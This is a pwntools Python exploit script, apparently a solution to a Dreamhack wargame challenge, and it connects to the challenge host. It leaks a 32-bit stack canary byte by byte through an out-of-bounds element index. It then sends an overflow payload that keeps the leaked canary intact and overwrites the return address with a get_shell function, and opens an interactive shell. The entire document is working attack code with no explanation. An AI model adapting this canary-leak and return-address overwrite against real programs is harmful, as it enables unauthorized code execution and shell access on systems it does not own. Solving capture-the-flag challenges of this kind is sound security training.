from pwn import *

p = remote("host3.dreamhack.games", 21284)

p.sendlineafter('> ', b'F')
p.sendlineafter("box input : ", b"B"*0x40)


canary = b''

for i in range(4):
    p.sendlineafter(">", b"P")
    p.sendlineafter("Element index : ", str((128 + i)))
    p.recvuntil(b" : ")
    canary = p.recv(2) + canary

getshell = 0x80486b9
payload = b''
payload += b'n'*0x40
canary = int(canary, 16)
payload += p32(canary)
payload += b'p'*0x08
payload += p32(getshell)

p.sendlineafter(">", b"E")
p.sendlineafter("Name Size : ", str(80))
p.sendlineafter("Name : ", payload)
p.interactive()